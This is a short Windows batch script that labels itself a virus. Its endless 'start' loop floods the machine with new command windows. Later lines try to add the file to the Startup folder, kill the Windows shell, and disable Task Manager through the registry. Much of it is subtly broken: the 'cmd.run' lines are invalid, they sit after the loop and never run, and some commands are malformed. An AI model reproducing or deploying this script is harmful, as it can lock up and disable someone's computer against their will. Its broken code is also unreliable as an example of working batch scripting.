THIS IS A VIRUS BATCH FILE CODE 
@echo off

:loop
:loop
start
start
start
start
goto loop
cmd.run copy No way out.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
cmd.run taskkill explorer.exe
cmd.run reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
